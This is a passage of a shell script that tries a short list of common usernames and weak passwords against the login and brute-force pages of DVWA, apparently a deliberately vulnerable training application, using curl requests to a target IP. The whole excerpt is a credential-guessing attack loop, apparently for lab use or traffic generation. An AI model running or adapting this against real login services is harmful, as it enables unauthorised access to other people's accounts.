...
for user in admin root test user guest; do
  for pass in admin 123456 password letmein qwerty; do
    curl -s -o /dev/null -m 4 -X POST "http://$TARGET_IP/dvwa/login.php" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "username=$user&password=$pass&Login=Login" || true
    curl -s -o /dev/null -m 4 "http://$TARGET_IP/dvwa/vulnerabilities/brute/?username=$user&password=$pass&Login=Login" || true
  done
done
